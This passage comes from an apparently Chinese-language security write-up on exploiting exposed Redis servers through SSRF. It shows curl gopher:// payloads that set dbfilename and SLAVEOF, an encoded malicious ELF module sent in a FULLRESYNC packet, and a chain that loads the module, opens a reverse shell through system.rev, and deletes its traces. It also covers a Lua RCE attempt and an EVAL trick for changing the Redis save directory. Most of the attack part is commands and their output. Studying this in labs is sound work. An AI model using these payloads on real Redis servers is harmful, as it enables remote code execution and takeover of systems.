            gopher_resp += '%' + hex(i)[2:]
        else:
            print('[!] error')
    print(gopher_resp)
```
先测试一下`CONFIG SET dbfilename exp.so`这种普通命令是否可行，
```shell
/usr/bin/python3.6 /home/xiaopo/python/POC/redis/fullresync_packet.py -f redis-rce/exp.so
Load the payload: redis-rce/exp.so
b'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'
%2a4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%246%0d%0aexp%2eso%0d%0a

# xiaopo @ fht in ~/python/POC/ssrf [20:32:14] 
$ curl -v 'gopher://127.0.0.1:6379/_%2a4%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%2410%0d%0adbfilename%0d%0a%246%0d%0aexp%2eso%0d%0a'
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)
+OK

127.0.0.1:6379> config get dbfilename
1) "dbfilename"
2) "exp.so"
```
在不开启redis rogue server的情况下，构造三段payload测试依次发送，
```shell
*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$9%0d%0a127.0.0.1%0d%0a$4%0d%0a2333%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a

%2bFULLRESYNC%20ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ%201%0d%0a%2444328%0d%0a%7fELF%02%01%01%00%00%00%00%00%00%00%00%00%03%00%3e%00%01%00%00%00%80%28%00%00%00%00%00%00%40%00%00%00%00%00%00%00%28%a7%00%00%00%00%00%00%00%00%00%00%40%008%00%05%00%40%00%18%00%17%00%01%00%00%00%05%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00DH%00%00%00%00%00%00DH%00%00%00%00%00%00%00%00%20%00%00%00%00%00%01%00%00%00%06%00%00%00%a0N%00%00%00%00%00%00%a0N%20%00%00%00%00%00%a0N%20%00%00%00%00%00%f0%01%00%00%00%00%00%00%d0%05%00%00%00%00%00%00%00%00%20%00%00%00%00%00%02%00%00%00%06%00%00%00%a0N%00%00%00%00%00%00%a0N%20%00%00%00%00%00%a0N%20%00%00%00%00%00%60%01%00%00%00%00%00%00%60%01%00%00%00%00%00%00%08%00%00%00%00%00%00%00Q%e5td%06%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%10%00%00%00%00%00%00%00R%e5td%04%00%00%00%a0N%00%00%00%00%00%00%a0N%20%00%00%00%00%00%a0N%20%00%00%00%00%00%60%01%00%00%00%00%00%00%60%01%00%00%00%00%00%00%01%00%00%00%00%00%00%00%83%00%00%00%92%00%00%00%00%00%00%004%00%00%00%00%00%00%00V%00%00%00u%00%00%00H%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%20%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%1d%00%00%00%83%00%00%00%00%00%00%00%00%00%00%00%09%00%00%005%00%00%00E%00%00%001%00%00%00%11......

*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a*3%0d%0a$10%0d%0asystem.rev%0d%0a$9%0d%0a127.0.0.1%0d%0a$4%0d%0a3000%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0adump.rdb%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$11%0d%0arm ./exp.so%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$6%0d%0aUNLOAD%0d%0a$6%0d%0asystem%0d%0a
```
其中在第二段payload在`+FULLRESYNC`发送的时候报错，

```shell
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)
-ERR unknown command '+FULLRESYNC'
-ERR unknown command '$44328'
```

提示没有`+FULLRESYNC`命令，因为以`+`开头的命令是响应包，我们尝试把`+`去掉，再次发包，

```shell
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 6379 (#0)
-ERR unknown command 'FULLRESYNC'
-ERR unknown command '$44328'
```
依然不行，看来还是需要rogue server与之自然交互。

## Lua RCE

原理：

https://www.anquanke.com/post/id/151203/

exp：

https://github.com/QAX-A-Team/redis_lua_exploit/

docker测试，redis版本4.0.14，修改redis_lua.py中的ip和port之后运行，报错：

https://github.com/QAX-A-Team/redis_lua_exploit/issues/1

尚未解决

## Tips

参考

https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt

> If target redis disabled `CONFIG SET`, `SAVE` commands, try to use `EVAL "return redis.call('config', 'set', 'dir', '/root')"`, `BGSAVE`, it only works on Redis 4.x. 
> On Redis 5.x, CONFIG command is a "no-script" command, which means you cannot invoke this command in Redis lua.

其中eval的格式为

```shell
127.0.0.1:6379> eval "要执行的lua命令" key的个数 [KEYS[1]...] [AVRG[1]...]
例子
127.0.0.1:6379> eval "return redis.call('SET',KEYS[1],ARGV[1])" 1 foo bar
OK
127.0.0.1:6379> eval "return redis.call('SET','name','gulugulu')" #没有写key个数，程序报错
(error) ERR wrong number of arguments for 'eval' command
127.0.0.1:6379> eval "return redis.call('SET','name','gulugulu')" 0
OK
```
笔者尝试redis 4.0.9和redis 4.0.14两个版本均提示成功，

```shell
127.0.0.1:6379> EVAL "return redis.call('config', 'set', 'dir', '/root')" 0
OK
127.0.0.1:6379> BGSAVE
Background saving started
```

## 参考

- https://paper.seebug.org/1169/
- https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf
- https://blog.szfszf.top/article/6/
- https://www.onebug.org/websafe/98675.html
- https://lorexxar.cn/2016/12/03/redis-getshell/
- https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/
- https://saucer-man.com/information_security/283.html
- https://github.com/vulhub/redis-rogue-getshell
- https://paper.seebug.org/975/
- https://ricterz.me/posts/2019-07-08-two-tricks-of-redis-exploitation.txt
- https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/#4-%E8%A1%A5%E5%85%85